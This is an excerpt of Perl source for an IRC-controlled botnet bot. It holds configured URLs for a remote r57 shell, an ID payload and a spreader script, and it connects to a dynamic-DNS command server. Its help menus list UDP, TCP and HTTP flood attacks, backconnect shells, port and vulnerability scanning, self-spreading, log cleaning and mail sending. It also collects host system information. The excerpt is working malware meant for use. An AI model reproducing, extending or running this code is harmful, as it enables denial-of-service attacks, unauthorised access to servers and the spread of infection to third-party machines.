...
#Sleep Time                                #
############################################
my $cmd="http://freewebs.com/alb_rinia/r57.txt?";
#-----------------                         #
#CMD that is printed in the channel        #
############################################
my $id="http://www.gg2003.de/phpBB2//language/kar/id.txt?";
#-----------------                         #
#ID = Response CMD                         #
############################################
my $spread="http://www.gg2003.de/phpBB2//language/kar/spread.txt?";
#-----------------                         #
#Spreader                                  #
############################################
my @adms=("MrNETi");
#my @hostauth=("mrneti.com");
#-----------------                         #
...
############################################
my $nick="LIN[TC|00|MR]".int(rand(1000))."";
#-----------------                         #
#Nickname of bot                           #
############################################
my $ircname ='Alb';
chop (my $realname = 'Albania Security Clan');
#-----------------                         #
#IRC name and Realname                     #
############################################
$servidor='mrcold.no-ip.biz' unless $servidor;
my $porta='6667';
#-----------------                         #
#IRCServer and port                        #
############################################
...
if ($funcarg =~ /^help/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@scanscan");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) Or if you want too know all the commands type:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@commands");
...
if ($funcarg =~ /^ddos/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@httpflood <site> <time>");
...
if ($funcarg =~ /^backconnect/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@back <ip><port>");
}
...
if ($funcarg =~ /^port/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@nmap <ip> <beginport> <endport>");
}
...
if ($funcarg =~ /^commands/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@nmap <ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc cd tmp 12 for example");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@spread <scan>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@scan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@sendmail <subject> <sender> <recipient> <message>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+Help4+) !asc 7@part #channel");
}
...
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Owner        : 7 cHApoenk");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+System Info4+) Channel      : 7 #354");
}
...
if($hosts{$hs}=="1"){
  sendraw($IRC_cur_socket, "PRIVMSG KoRn :(12+SafeMode:4OFF12+) (12+Vuln:7 $print 12+)");
